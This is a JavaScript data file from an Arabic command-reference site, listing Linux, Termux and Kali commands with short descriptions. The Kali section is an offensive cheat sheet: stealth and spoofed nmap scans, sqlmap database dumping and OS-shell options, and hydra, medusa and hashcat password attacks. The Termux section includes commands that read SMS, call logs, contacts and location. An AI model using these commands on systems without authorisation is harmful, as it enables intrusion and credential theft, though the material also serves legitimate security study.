/* ============================================================
   SECRET BOX — COMMANDS DATABASE
   Developed by: Ahmed Ali (Black Lord / السيد الأسود)
   Version: 15.0 — 1500+ Commands
   ============================================================
   أعطيك معلومات مجاناً — لا تبخل عليّ وانشر الموقع ليستفيد غيرك
   ============================================================
   البنية: "الأمر###الوصف###الفئة الفرعية###المنصة"
   ============================================================ */

(function () {
  'use strict';

  /* ============================================================
     COMMANDS DATABASE — 1500+ COMMANDS
     ============================================================ */
  const RAW_DATA = {

    /* ==================== LINUX ==================== */
    linux: `
pwd###عرض المسار الحالي###ملفات###Linux
ls###عرض الملفات###ملفات###Linux
ls -la###عرض مفصل كل الملفات###ملفات###Linux
ls -lh###أحجام مفهومة###ملفات###Linux
ls -latr###مرتب بالتاريخ معكوس###ملفات###Linux
ls -lS###مرتب بالحجم###ملفات###Linux
ls -R###عرض متكرر###ملفات###Linux
ls -d */###المجلدات فقط###ملفات###Linux
cd /path###تغيير مجلد###ملفات###Linux
cd ..###الرجوع خطوة###ملفات###Linux
cd ~###المجلد الرئيسي###ملفات###Linux
cd -###المجلد السابق###ملفات###Linux
cd /###الجذر###ملفات###Linux
mkdir folder###إنشاء مجلد###ملفات###Linux
mkdir -p a/b/c###إنشاء متداخل###ملفات###Linux
mkdir -m 755 folder###صلاحيات محددة###ملفات###Linux
rmdir folder###حذف مجلد فارغ###ملفات###Linux
touch file###إنشاء ملف فارغ###ملفات###Linux
touch -t 202401011200 file###تاريخ مخصص###ملفات###Linux
cp src dst###نسخ ملف###ملفات###Linux
cp -r src dst###نسخ متكرر###ملفات###Linux
cp -p src dst###حفظ الأذونات###ملفات###Linux
cp -v src dst###مع تفاصيل###ملفات###Linux
mv old new###نقل أو إعادة تسمية###ملفات###Linux
rm file###حذف ملف###ملفات###Linux
rm -rf folder###حذف نهائي متكرر###ملفات###Linux
rm -i file###حذف بتأكيد###ملفات###Linux
ln -s target link###رابط رمزي###ملفات###Linux
ln target link###رابط صلب###ملفات###Linux
find / -name '*.txt'###بحث بالاسم###ملفات###Linux
find / -type d -name 'config'###بحث مجلدات###ملفات###Linux
find / -size +100M###ملفات أكبر من 100MB###ملفات###Linux
find / -mtime -7###معدلة آخر أسبوع###ملفات###Linux
find / -mtime +30###أقدم من شهر###ملفات###Linux
find / -user root###ملفات root###ملفات###Linux
find / -perm -4000###ملفات SUID###أمن###Linux
find / -perm -2000###ملفات SGID###أمن###Linux
find / -writable -type d###قابلة للكتابة###ملفات###Linux
find / -empty###ملفات فارغة###ملفات###Linux
find . -exec rm {} \\;###حذف نتائج البحث###ملفات###Linux
locate filename###بحث سريع###ملفات###Linux
updatedb###تحديث قاعدة locate###ملفات###Linux
stat file###تفاصيل كاملة###ملفات###Linux
file filename###نوع الملف###ملفات###Linux
tree -L 2###شجرة بعمق 2###ملفات###Linux
tree -a###بما فيها المخفية###ملفات###Linux
du -sh folder###حجم مجلد###ملفات###Linux
du -h --max-depth=1###أحجام مباشرة###ملفات###Linux
df -h###مساحة الأقراص###ملفات###Linux
df -i###inodes###ملفات###Linux
mount /dev/sdb1 /mnt###تحميل قرص###ملفات###Linux
umount /mnt###إلغاء تحميل###ملفات###Linux
mount -o loop file.iso /mnt###تحميل ISO###ملفات###Linux
chmod 755 file###صلاحيات التنفيذ###صلاحيات###Linux
chmod 644 file###صلاحيات القراءة###صلاحيات###Linux
chmod 600 secret###قراءة للمالك###صلاحيات###Linux
chmod 777 everything###خطير###صلاحيات###Linux
chmod +x script.sh###تنفيذ###صلاحيات###Linux
chmod u+x file###تنفيذ للمالك###صلاحيات###Linux
chmod g-w file###إزالة كتابة المجموعة###صلاحيات###Linux
chmod o-rwx file###منع الآخرين###صلاحيات###Linux
chmod -R 755 folder###متكرر###صلاحيات###Linux
chown user:group file###تغيير الملكية###صلاحيات###Linux
chown -R user folder###متكرر###صلاحيات###Linux
chgrp group file###تغيير المجموعة###صلاحيات###Linux
umask 022###الصلاحيات الافتراضية###صلاحيات###Linux
getfacl file###عرض ACL###صلاحيات###Linux
setfacl -m u:user:rw file###تعيين ACL###صلاحيات###Linux
setfacl -x u:user file###إزالة ACL###صلاحيات###Linux
whoami###من أنا###مستخدمون###Linux
id###uid,gid,groups###مستخدمون###Linux
id username###معلومات مستخدم###مستخدمون###Linux
who###المسجلون الآن###مستخدمون###Linux
w###من يفعل ماذا###مستخدمون###Linux
last###آخر تسجيلات###مستخدمون###Linux
last -20###آخر 20 تسجيل###مستخدمون###Linux
lastlog###آخر دخول لكل مستخدم###مستخدمون###Linux
useradd -m newuser###مستخدم جديد###مستخدمون###Linux
useradd -m -s /bin/bash user###مع shell###مستخدمون###Linux
userdel -r olduser###حذف مستخدم###مستخدمون###Linux
usermod -aG sudo user###إضافة للمجموعة###مستخدمون###Linux
usermod -L user###قفل الحساب###مستخدمون###Linux
usermod -U user###فتح الحساب###مستخدمون###Linux
passwd###تغيير كلمة مرورك###مستخدمون###Linux
passwd user###تغيير كلمة مرور مستخدم###مستخدمون###Linux
passwd -l user###قفل الحساب###مستخدمون###Linux
groupadd team###إنشاء مجموعة###مستخدمون###Linux
groupdel team###حذف مجموعة###مستخدمون###Linux
groups user###مجموعات المستخدم###مستخدمون###Linux
sudo su -###الدخول كـ root###مستخدمون###Linux
su username###تبديل مستخدم###مستخدمون###Linux
sudo -l###صلاحيات sudo###مستخدمون###Linux
chage -l user###معلومات انتهاء الحساب###مستخدمون###Linux
ps aux###كل العمليات###عمليات###Linux
ps -ef###صيغة أخرى###عمليات###Linux
ps -eo pid,ppid,cmd###مخصص###عمليات###Linux
ps aux | grep proc###بحث في العمليات###عمليات###Linux
top###مراقبة مباشرة###عمليات###Linux
htop###مراقبة تفاعلية###عمليات###Linux
pstree###شجرة العمليات###عمليات###Linux
pgrep firefox###PID بالاسم###عمليات###Linux
pidof firefox###PID###عمليات###Linux
kill -9 PID###إيقاف قسري###عمليات###Linux
kill -15 PID###إيقاف بلطف###عمليات###Linux
kill -HUP PID###إعادة تحميل###عمليات###Linux
pkill firefox###إيقاف بالاسم###عمليات###Linux
killall chrome###إيقاف كل النسخ###عمليات###Linux
nice -n 10 cmd###أولوية منخفضة###عمليات###Linux
nice -n -10 cmd###أولوية عالية###عمليات###Linux
renice 5 -p PID###تعديل الأولوية###عمليات###Linux
jobs###المهام الخلفية###عمليات###Linux
bg %1###تشغيل بالخلفية###عمليات###Linux
fg %1###إحضار للأمام###عمليات###Linux
nohup cmd &###بدون إيقاف###عمليات###Linux
disown###فصل من shell###عمليات###Linux
screen -S name###جلسة screen###عمليات###Linux
screen -r name###استعادة جلسة###عمليات###Linux
tmux new -s name###جلسة tmux###عمليات###Linux
tmux attach -t name###الاتصال###عمليات###Linux
tmux ls###قائمة الجلسات###عمليات###Linux
crontab -e###تعديل المهام###جدولة###Linux
crontab -l###عرض المهام###جدولة###Linux
crontab -r###حذف الكل###جدولة###Linux
crontab -u user -e###لمستخدم###جدولة###Linux
at 3pm###مهمة واحدة###جدولة###Linux
atq###قائمة المهام###جدولة###Linux
atrm 1###حذف مهمة###جدولة###Linux
systemd-run --on-calendar###مؤقت systemd###جدولة###Linux
uname -a###معلومات النواة###نظام###Linux
uname -r###إصدار النواة###نظام###Linux
hostname###اسم الجهاز###نظام###Linux
hostnamectl###تفاصيل النظام###نظام###Linux
uptime###مدة التشغيل###نظام###Linux
lsb_release -a###إصدار التوزيعة###نظام###Linux
cat /etc/os-release###معلومات OS###نظام###Linux
dmesg###رسائل النواة###نظام###Linux
dmesg | tail -50###آخر 50 رسالة###نظام###Linux
dmesg -T###بالتاريخ###نظام###Linux
journalctl -xe###سجلات systemd###نظام###Linux
journalctl -u ssh###سجلات خدمة###نظام###Linux
journalctl -u ssh -f###متابعة مباشرة###نظام###Linux
journalctl --since today###منذ اليوم###نظام###Linux
journalctl -b###هذه الجلسة###نظام###Linux
systemctl status service###حالة خدمة###نظام###Linux
systemctl start service###تشغيل###نظام###Linux
systemctl stop service###إيقاف###نظام###Linux
systemctl restart service###إعادة###نظام###Linux
systemctl reload service###إعادة تحميل###نظام###Linux
systemctl enable service###تشغيل تلقائي###نظام###Linux
systemctl disable service###إلغاء تلقائي###نظام###Linux
systemctl is-active service###هل يعمل؟###نظام###Linux
systemctl --failed###الفاشلة###نظام###Linux
systemctl list-units###كل الوحدات###نظام###Linux
systemctl daemon-reload###إعادة تحميل###نظام###Linux
systemctl mask service###تعطيل كامل###نظام###Linux
free -h###الذاكرة###نظام###Linux
free -m###بالميجا###نظام###Linux
vmstat 1###إحصائيات مباشرة###نظام###Linux
iostat###I/O###نظام###Linux
sar###معلومات تاريخية###نظام###Linux
lscpu###معلومات CPU###نظام###Linux
lsblk###الأقراص###نظام###Linux
lspci###أجهزة PCI###نظام###Linux
lsusb###أجهزة USB###نظام###Linux
lsmod###الوحدات المحملة###نظام###Linux
modprobe module###تحميل وحدة###نظام###Linux
cat /proc/cpuinfo###تفاصيل CPU###نظام###Linux
cat /proc/meminfo###تفاصيل الذاكرة###نظام###Linux
cat /proc/version###إصدار النواة###نظام###Linux
ip a###عناوين IP###شبكات###Linux
ip r###التوجيه###شبكات###Linux
ip link show###الواجهات###شبكات###Linux
ip link set eth0 up###تفعيل واجهة###شبكات###Linux
ip link set eth0 down###إيقاف واجهة###شبكات###Linux
ifconfig###الأقدم###شبكات###Linux
ifconfig eth0###واجهة محددة###شبكات###Linux
iwconfig###لاسلكي###شبكات###Linux
ping host###اختبار الاتصال###شبكات###Linux
ping -c 4 host###4 حزم###شبكات###Linux
ping -i 0.2 host###سريع###شبكات###Linux
ping -s 1000 host###حجم مخصص###شبكات###Linux
traceroute host###تتبع المسار###شبكات###Linux
traceroute -T host###TCP###شبكات###Linux
mtr host###traceroute+ping###شبكات###Linux
dig domain.com###DNS###شبكات###Linux
dig @8.8.8.8 domain ANY###سيرفر محدد###شبكات###Linux
dig +short domain###مختصر###شبكات###Linux
dig -x 8.8.8.8###عكسي###شبكات###Linux
nslookup domain###استعلام DNS###شبكات###Linux
host domain###DNS###شبكات###Linux
host -t MX domain###سجلات MX###شبكات###Linux
whois domain###معلومات النطاق###شبكات###Linux
netstat -tulnp###المنافذ###شبكات###Linux
netstat -an | grep LISTEN###الاستماع###شبكات###Linux
ss -tuln###بديل حديث###شبكات###Linux
ss -tlnp###مع العمليات###شبكات###Linux
lsof -i :80###من يستخدم المنفذ###شبكات###Linux
lsof -i -P -n###كل الاتصالات###شبكات###Linux
curl -I URL###ترويسات###شبكات###Linux
curl -X GET URL###GET###شبكات###Linux
curl -X POST -d data URL###POST###شبكات###Linux
curl -X PUT URL###PUT###شبكات###Linux
curl -X DELETE URL###DELETE###شبكات###Linux
curl -H 'Auth: Bearer t' URL###ترويسة###شبكات###Linux
curl --cookie 'k=v' URL###cookies###شبكات###Linux
curl -O URL###تحميل###شبكات###Linux
curl -L URL###redirects###شبكات###Linux
curl -u user:pass URL###مصادقة###شبكات###Linux
wget URL###تحميل###شبكات###Linux
wget -c URL###استكمال###شبكات###Linux
wget -r -np URL###موقع كامل###شبكات###Linux
wget --mirror URL###مرآة###شبكات###Linux
nc -lvnp 4444###استماع###شبكات###Linux
nc 192.168.1.1 80###اتصال###شبكات###Linux
nc -zv host 1-1000###فحص منافذ###شبكات###Linux
socat TCP-LISTEN:4444 -###بديل###شبكات###Linux
ssh user@host###SSH###شبكات###Linux
ssh user@host -p 2222###منفذ مخصص###شبكات###Linux
ssh -i key.pem user@host###بمفتاح###شبكات###Linux
ssh -v user@host###تفاصيل###شبكات###Linux
ssh-keygen -t ed25519###مفتاح SSH###شبكات###Linux
ssh-keygen -t rsa -b 4096###RSA 4096###شبكات###Linux
ssh-copy-id user@host###نسخ المفتاح###شبكات###Linux
ssh -D 1080 user@host###SOCKS proxy###شبكات###Linux
ssh -L 8080:localhost:80 u@h###نفق محلي###شبكات###Linux
ssh -R 8080:localhost:80 u@h###نفق عكسي###شبكات###Linux
scp file user@host:/path###نقل مشفر###شبكات###Linux
scp -r folder user@host:/path###مجلد###شبكات###Linux
rsync -avz src dst###مزامنة###شبكات###Linux
rsync -avz --delete src dst###مع الحذف###شبكات###Linux
sftp user@host###SFTP###شبكات###Linux
cat file###عرض ملف###نصوص###Linux
less file###صفحة بصفحة###نصوص###Linux
more file###عرض بسيط###نصوص###Linux
head -20 file###أول 20###نصوص###Linux
tail -20 file###آخر 20###نصوص###Linux
tail -f log###متابعة مباشرة###نصوص###Linux
grep 'x' file###بحث###نصوص###Linux
grep -r 'text' /path###متكرر###نصوص###Linux
grep -i 'x' file###بدون حالة###نصوص###Linux
grep -v 'x' file###عكس###نصوص###Linux
grep -c 'x' file###عدد###نصوص###Linux
grep -n 'x' file###مع رقم سطر###نصوص###Linux
grep -E 'regex' file###regex###نصوص###Linux
grep -w 'word' file###كلمة كاملة###نصوص###Linux
sed 's/old/new/g' file###استبدال###نصوص###Linux
sed -i 's/old/new/g' file###استبدال مباشر###نصوص###Linux
sed -n '10,20p' file###سطور محددة###نصوص###Linux
sed 's/^/prefix/' file###إضافة بادئة###نصوص###Linux
awk '{print $1}' file###عمود أول###نصوص###Linux
awk -F: '{print $1}'###فاصل مخصص###نصوص###Linux
awk '{sum+=$1} END{print sum}'###مجموع###نصوص###Linux
cut -d: -f1 file###قطع###نصوص###Linux
sort file###ترتيب###نصوص###Linux
sort -r file###معكوس###نصوص###Linux
sort -n file###رقمي###نصوص###Linux
sort -u file###فريد###نصوص###Linux
uniq file###إزالة تكرار###نصوص###Linux
sort file | uniq -c###عد التكرارات###نصوص###Linux
wc -l file###أسطر###نصوص###Linux
wc -w file###كلمات###نصوص###Linux
wc -c file###أحرف###نصوص###Linux
diff file1 file2###مقارنة###نصوص###Linux
diff -y file1 file2###جنب إلى جنب###نصوص###Linux
comm f1 f2###مقارنة أسطر###نصوص###Linux
tr 'a-z' 'A-Z' < file###ترجمة###نصوص###Linux
echo text###طباعة###نصوص###Linux
echo -e "a\\nb"###تفسير escapes###نصوص###Linux
printf '%s\\n' text###منسق###نصوص###Linux
tee file###كتابة وعرض###نصوص###Linux
tee -a file###إضافة###نصوص###Linux
xargs###بناء أوامر###نصوص###Linux
tar czf f.tar.gz folder###ضغط###أرشيف###Linux
tar xzf f.tar.gz###فك###أرشيف###Linux
tar tzf f.tar.gz###عرض محتوى###أرشيف###Linux
tar cjf f.tar.bz2 folder###bz2###أرشيف###Linux
tar xjf f.tar.bz2###فك bz2###أرشيف###Linux
tar cJf f.tar.xz folder###xz###أرشيف###Linux
tar xJf f.tar.xz###فك xz###أرشيف###Linux
zip -r file.zip folder###zip###أرشيف###Linux
zip -r -P pass file.zip folder###بكلمة مرور###أرشيف###Linux
unzip file.zip###فك zip###أرشيف###Linux
unzip -l file.zip###عرض محتوى###أرشيف###Linux
gzip file###gz###أرشيف###Linux
gunzip file.gz###فك gz###أرشيف###Linux
7z a file.7z folder###7z###أرشيف###Linux
7z x file.7z###فك 7z###أرشيف###Linux
bzip2 file###bz2###أرشيف###Linux
bunzip2 file.bz2###فك bz2###أرشيف###Linux
xz file###xz###أرشيف###Linux
unxz file.xz###فك xz###أرشيف###Linux
apt update###تحديث قوائم###حزم###Linux
apt upgrade###ترقية###حزم###Linux
apt full-upgrade###ترقية كاملة###حزم###Linux
apt install pkg###تثبيت###حزم###Linux
apt install -y pkg###بدون تأكيد###حزم###Linux
apt remove pkg###إزالة###حزم###Linux
apt purge pkg###إزالة كاملة###حزم###Linux
apt search keyword###بحث###حزم###Linux
apt show pkg###تفاصيل###حزم###Linux
apt list --installed###المثبتة###حزم###Linux
apt list --upgradable###قابلة للترقية###حزم###Linux
apt autoremove###تنظيف###حزم###Linux
apt autoclean###تنظيف الكاش###حزم###Linux
apt-get -f install###إصلاح###حزم###Linux
dpkg -i file.deb###تثبيت deb###حزم###Linux
dpkg -l###الحزم المثبتة###حزم###Linux
dpkg -L pkg###ملفات الحزمة###حزم###Linux
add-apt-repository ppa:name###إضافة PPA###حزم###Linux
dnf install pkg###Fedora تثبيت###حزم###Linux
dnf remove pkg###Fedora إزالة###حزم###Linux
dnf search keyword###Fedora بحث###حزم###Linux
dnf update###Fedora تحديث###حزم###Linux
yum install pkg###CentOS تثبيت###حزم###Linux
pacman -S pkg###Arch تثبيت###حزم###Linux
pacman -Rns pkg###Arch إزالة###حزم###Linux
pacman -Syu###Arch تحديث###حزم###Linux
pacman -Ss keyword###Arch بحث###حزم###Linux
apk add pkg###Alpine تثبيت###حزم###Linux
apk del pkg###Alpine إزالة###حزم###Linux
apk update###Alpine تحديث###حزم###Linux
zypper install pkg###openSUSE###حزم###Linux
snap install pkg###Snap###حزم###Linux
flatpak install app###Flatpak###حزم###Linux
ufw enable###تفعيل UFW###جدارناري###Linux
ufw disable###إلغاء UFW###جدارناري###Linux
ufw status verbose###الحالة###جدارناري###Linux
ufw allow 22/tcp###السماح###جدارناري###Linux
ufw deny 23###منع###جدارناري###Linux
ufw allow from 192.168.1.0/24###نطاق###جدارناري###Linux
ufw delete allow 22/tcp###حذف قاعدة###جدارناري###Linux
ufw reset###إعادة تعيين###جدارناري###Linux
iptables -L -n -v###عرض###جدارناري###Linux
iptables -A INPUT -p tcp --dport 22 -j ACCEPT###إضافة###جدارناري###Linux
iptables -A INPUT -j DROP###حظر الكل###جدارناري###Linux
iptables -D INPUT 1###حذف قاعدة###جدارناري###Linux
iptables -F###تفريغ###جدارناري###Linux
iptables-save > rules.v4###حفظ###جدارناري###Linux
iptables-restore < rules.v4###استعادة###جدارناري###Linux
firewall-cmd --state###firewalld###جدارناري###Linux
firewall-cmd --add-port=80/tcp --permanent###إضافة منفذ###جدارناري###Linux
firewall-cmd --reload###إعادة تحميل###جدارناري###Linux
firewall-cmd --list-all###كل القواعد###جدارناري###Linux
nft list ruleset###nftables###جدارناري###Linux
fail2ban-client status###حالة fail2ban###جدارناري###Linux
fail2ban-client status sshd###حالة SSH###جدارناري###Linux
`,

    /* ==================== TERMUX ==================== */
    termux: `
pkg update###تحديث###أساسيات###Termux
pkg upgrade -y###ترقية###أساسيات###Termux
pkg install git###git###حزم###Termux
pkg install python###Python###حزم###Termux
pkg install nano###محرر nano###حزم###Termux
pkg install vim###محرر vim###حزم###Termux
pkg install curl###curl###حزم###Termux
pkg install wget###wget###حزم###Termux
pkg install nmap###Nmap###أمن###Termux
pkg install hydra###Hydra###أمن###Termux
pkg install aircrack-ng###Aircrack###أمن###Termux
pkg install openssh###SSH###شبكات###Termux
pkg install proot-distro###Proot###توزيعات###Termux
pkg install root-repo###مستودع root###حزم###Termux
pkg install x11-repo###X11###حزم###Termux
pkg install termux-api###API الهاتف###الهاتف###Termux
pkg install zsh###zsh###تخصيص###Termux
pkg install starship###prompt###تخصيص###Termux
pkg install tmux###tmux###أدوات###Termux
pkg install htop###htop###أدوات###Termux
pkg install tree###tree###أدوات###Termux
pkg install figlet###نص كبير###أدوات###Termux
pkg install toilet###نص ملون###أدوات###Termux
pkg install mpv###mpv###وسائط###Termux
pkg install ffmpeg###ffmpeg###وسائط###Termux
pkg install neofetch###neofetch###أدوات###Termux
pkg install jq###jq JSON###أدوات###Termux
pkg install tsu###tsu root###أدوات###Termux
pkg uninstall pkg###إزالة###حزم###Termux
pkg list-all###كل الحزم###حزم###Termux
pkg show pkg###تفاصيل###حزم###Termux
pkg search keyword###بحث###حزم###Termux
pip install sqlmap###sqlmap###أمن###Termux
pip install requests###requests###Python###Termux
pip install scapy###scapy###Python###Termux
pip install paramiko###paramiko###Python###Termux
pip install cryptography###تشفير###Python###Termux
pip install pycryptodome###تشفير###Python###Termux
pip install shodan###shodan###OSINT###Termux
pip install beautifulsoup4###bs4###Python###Termux
pip install colorama###ألوان###Python###Termux
pip install rich###rich###Python###Termux
pip install virtualenv###بيئات###Python###Termux
pip install flask###Flask###Python###Termux
pip install django###Django###Python###Termux
pip install pillow###Pillow###Python###Termux
pip install numpy###NumPy###Python###Termux
proot-distro list###قائمة###توزيعات###Termux
proot-distro install ubuntu###Ubuntu###توزيعات###Termux
proot-distro install kali###Kali###توزيعات###Termux
proot-distro install debian###Debian###توزيعات###Termux
proot-distro install archlinux###Arch###توزيعات###Termux
proot-distro install alpine###Alpine###توزيعات###Termux
proot-distro install fedora###Fedora###توزيعات###Termux
proot-distro login ubuntu###دخول###توزيعات###Termux
proot-distro login kali###دخول Kali###توزيعات###Termux
proot-distro remove ubuntu###إزالة###توزيعات###Termux
proot-distro reset ubuntu###إعادة تعيين###توزيعات###Termux
termux-setup-storage###التخزين###إعداد###Termux
termux-change-repo###المستودع###إعداد###Termux
termux-reload-settings###إعادة###إعداد###Termux
termux-wake-lock###منع النوم###إعداد###Termux
termux-wake-unlock###إلغاء###إعداد###Termux
termux-info###معلومات###إعداد###Termux
termux-open file###فتح ملف###إعداد###Termux
termux-open-url URL###فتح رابط###إعداد###Termux
termux-share file###مشاركة###إعداد###Termux
termux-battery-status###البطارية###API###Termux
termux-camera-photo -c 0 out.jpg###صورة###API###Termux
termux-camera-info###معلومات كاميرا###API###Termux
termux-location###الموقع###API###Termux
termux-notification --title x --content y###إشعار###API###Termux
termux-notification-remove id###حذف إشعار###API###Termux
termux-notification-list###قائمة الإشعارات###API###Termux
termux-sms-send -n +123 text###SMS###API###Termux
termux-sms-list###قائمة SMS###API###Termux
termux-call-log###مكالمات###API###Termux
termux-contact-list###جهات اتصال###API###Termux
termux-tts-speak text###صوت###API###Termux
termux-clipboard-get###قراءة الحافظة###API###Termux
termux-clipboard-set text###كتابة###API###Termux
termux-toast msg###إشعار###API###Termux
termux-vibrate -d 1000###اهتزاز###API###Termux
termux-torch on###فلاش###API###Termux
termux-torch off###إطفاء###API###Termux
termux-volume###الصوت###API###Termux
termux-wifi-connectioninfo###WiFi###API###Termux
termux-wifi-scaninfo###مسح WiFi###API###Termux
termux-wifi-enable true###تفعيل WiFi###API###Termux
termux-fingerprint###بصمة###API###Termux
termux-sensor -l###قائمة الحساسات###API###Termux
termux-sensor -s sensor###قراءة حساس###API###Termux
termux-download URL###تحميل###API###Termux
termux-job-scheduler###مهام مجدولة###API###Termux
termux-keystore###keystore###API###Termux
sshd###تشغيل SSH###شبكات###Termux
pkill sshd###إيقاف SSH###شبكات###Termux
whoami###المستخدم###معلومات###Termux
whoami###اسم المستخدم###معلومات###Termux
exit###خروج###أساسيات###Termux
clear###تنظيف###أساسيات###Termux
history###السجل###أساسيات###Termux
history -c###مسح السجل###أساسيات###Termux
!!###آخر أمر###أساسيات###Termux
man command###دليل###أساسيات###Termux
command --help###مساعدة###أساسيات###Termux
alias ll="ls -la"###اختصار###أساسيات###Termux
unalias ll###حذف اختصار###أساسيات###Termux
export VAR=value###متغير###أساسيات###Termux
unset VAR###حذف متغير###أساسيات###Termux
echo $VAR###قراءة متغير###أساسيات###Termux
env###كل المتغيرات###أساسيات###Termux
source script.sh###تنفيذ###أساسيات###Termux
chmod +x script.sh###تنفيذ###أساسيات###Termux
./script.sh###تشغيل###أساسيات###Termux
bash script.sh###تشغيل bash###أساسيات###Termux
zsh###تشغيل zsh###أساسيات###Termux
which command###مكان الأمر###أساسيات###Termux
whereis command###مكان أوسع###أساسيات###Termux
type command###نوع الأمر###أساسيات###Termux
`,

    /* ==================== KALI ==================== */
    kali: `
nmap -sV target###فحص الخدمات###Recon###Kali
nmap -sC target###سكربتات###Recon###Kali
nmap -p- target###كل المنافذ###Recon###Kali
nmap -p 1-1000 target###نطاق###Recon###Kali
nmap -sn 192.168.1.0/24###اكتشاف###Recon###Kali
nmap -sU target###UDP###Recon###Kali
nmap -A target###شامل###Recon###Kali
nmap -O target###نظام###Recon###Kali
nmap -T4 target###سريع###Recon###Kali
nmap -T0 target###بطيء متخفي###Recon###Kali
nmap -sS target###SYN###Recon###Kali
nmap -sT target###TCP connect###Recon###Kali
nmap -Pn target###بدون ping###Recon###Kali
nmap -f target###مفتت###Recon###Kali
nmap -D RND:10 target###decoys###Recon###Kali
nmap -S spoofed target###IP مزيف###Recon###Kali
nmap -oN output.txt###حفظ نصي###Recon###Kali
nmap -oX output.xml###حفظ XML###Recon###Kali
nmap --script vuln target###سكربتات ثغرات###Recon###Kali
nmap --script=http-enum target###ويب###Recon###Kali
nmap --script=smb-enum-shares target###SMB###Recon###Kali
nmap --script=ftp-anon target###FTP مجهول###Recon###Kali
nmap --script=dns-zone-transfer###نقل منطقة###Recon###Kali
masscan -p1-65535 --rate=1000 target###سريع جداً###Recon###Kali
masscan -p80,443 10.0.0.0/8###نطاق###Recon###Kali
rustscan -a target###حديث###Recon###Kali
theHarvester -d domain -b all###إيميلات###Recon###Kali
theHarvester -d domain -b google###Google###Recon###Kali
dnsenum domain###DNS###Recon###Kali
dnsrecon -d domain###DNS###Recon###Kali
fierce --domain domain###DNS###Recon###Kali
amass enum -d domain###نطاقات###Recon###Kali
amass intel -d domain###استخبارات###Recon###Kali
subfinder -d domain###فرعية###Recon###Kali
subfinder -d domain -all###شامل###Recon###Kali
sublist3r -d domain###بديل###Recon###Kali
assetfinder domain###بديل###Recon###Kali
findomain -t domain###حديث###Recon###Kali
whois domain###معلومات###Recon###Kali
recon-ng###إطار###Recon###Kali
maltego###تحليل###Recon###Kali
spiderfoot -l 127.0.0.1:5001###أتمتة###Recon###Kali
whatweb URL###تقنيات موقع###Recon###Kali
wafw00f URL###كشف WAF###Recon###Kali
enum4linux target###تعداد Linux###Recon###Kali
enum4linux-ng target###حديث###Recon###Kali
smbclient -L //target###SMB###Recon###Kali
smbmap -H target###SMB map###Recon###Kali
smbmap -u user -p pass -H target###بمصادقة###Recon###Kali
rpcclient -U '' target###RPC###Recon###Kali
ldapsearch -x -H ldap://target###LDAP###Recon###Kali
kerbrute userenum wordlist --dc dc###Kerberos###Recon###Kali
smtp-user-enum -M VRFY -U users -t target###SMTP###Recon###Kali
snmpwalk -v2c -c public target###SNMP###Recon###Kali
snmp-check target###SNMP###Recon###Kali
sqlmap -u URL --dbs###قواعد###Web###Kali
sqlmap -u URL --tables###جداول###Web###Kali
sqlmap -u URL --columns###أعمدة###Web###Kali
sqlmap -u URL --dump###استخراج###Web###Kali
sqlmap -u URL -D db -T table --dump###جدول محدد###Web###Kali
sqlmap -u URL --os-shell###shell###Web###Kali
sqlmap -u URL --os-cmd=cmd###تنفيذ###Web###Kali
sqlmap -r request.txt###من ملف###Web###Kali
sqlmap -u URL --batch###تلقائي###Web###Kali
sqlmap -u URL --level=5 --risk=3###عميق###Web###Kali
sqlmap -u URL --technique=BEUSTQ###تقنيات###Web###Kali
sqlmap -u URL --tamper=space2comment###تحايل###Web###Kali
gobuster dir -u URL -w list###مسارات###Web###Kali
gobuster dir -u URL -w list -x php,html###امتدادات###Web###Kali
gobuster dns -d domain -w list###DNS###Web###Kali
gobuster vhost -u URL -w list###vhost###Web###Kali
ffuf -u URL/FUZZ -w list###fuzzing###Web###Kali
ffuf -u URL -H 'Host: FUZZ' -w list###vhost###Web###Kali
ffuf -u URL?param=FUZZ -w list###معامل###Web###Kali
ffuf -u URL/FUZZ -w list -mc 200###فلترة###Web###Kali
wfuzz -c -z file,list URL/FUZZ###fuzzer###Web###Kali
dirb URL wordlist###مسارات###Web###Kali
dirsearch -u URL###بديل###Web###Kali
feroxbuster -u URL###سريع###Web###Kali
nikto -h URL###ماسح###Web###Kali
nikto -h URL -Tuning 123###تخصيص###Web###Kali
wpscan --url URL###WordPress###Web###Kali
wpscan --url URL --enumerate u###مستخدمون###Web###Kali
wpscan --url URL --enumerate vp###إضافات###Web###Kali
wpscan --url URL --enumerate vt###ثيمات###Web###Kali
wpscan --url URL --api-token TOKEN###بـ API###Web###Kali
joomscan -u URL###Joomla###Web###Kali
droopescan scan drupal -u URL###Drupal###Web###Kali
nuclei -u URL###قوالب###Web###Kali
nuclei -u URL -t cves/###CVE###Web###Kali
nuclei -u URL -t exposures/###تسريبات###Web###Kali
xsstrike -u URL###XSS###Web###Kali
dalfox url URL###XSS حديث###Web###Kali
commix -u URL###حقن أوامر###Web###Kali
arjun -u URL###معاملات###Web###Kali
paramspider -d domain###معاملات###Web###Kali
httpx -l urls.txt###فحص HTTP###Web###Kali
subjack -w list -t 100###subdomain takeover###Web###Kali
hydra -l user -P pass.txt ssh://host###SSH###Password###Kali
hydra -L users -P pass.txt ftp://host###FTP###Password###Kali
hydra -l admin -P pass.txt http-post-form###HTTP###Password###Kali
hydra -l user -P pass.txt rdp://host###RDP###Password###Kali
hydra -l user -P pass.txt smb://host###SMB###Password###Kali
hydra -l user -P pass.txt mysql://host###MySQL###Password###Kali
hydra -l user -P pass.txt vnc://host###VNC###Password###Kali
hydra -l user -P pass.txt telnet://host###Telnet###Password###Kali
hydra -P pass.txt -e nsr ssh://host###تجارب ذكية###Password###Kali
hydra -t 4 -l user -P pass.txt ssh://host###4 خيوط###Password###Kali
medusa -h host -u user -P pass.txt -M ssh###Medusa###Password###Kali
medusa -H hosts.txt -U users -P passes -M ssh###متعدد###Password###Kali
patator ssh_login host=t user=u password=FILE0 0=list###Patator###Password###Kali
ncrack -p 22 --user user -P pass.txt host###Ncrack###Password###Kali
hashcat -m 0 hash.txt list###MD5###Password###Kali
hashcat -m 100 hash.txt list###SHA1###Password###Kali
hashcat -m 1000 hash.txt list###NTLM###Password###Kali
hashcat -m 1800 hash.txt list###SHA-512###Password###Kali
hashcat -m 22000 hash.txt list###WPA###Password###Kali
hashcat -m 500 hash.txt list###MD5crypt###Password###Kali
hashcat -m 3200 hash.txt list###bcrypt###Password###Kali
hashcat -m 0 -a 3 hash.txt ?a?a?a?a###brute###Password###Kali
hashcat -m 0 -a 6 hash.txt list ?d?d###hybrid###Password###Kali
hashcat -m 0 -a 0 -r rule.rule hash.txt list###بقواعد###Password###Kali
hashcat --show hash.txt###النتائج###Password###Kali
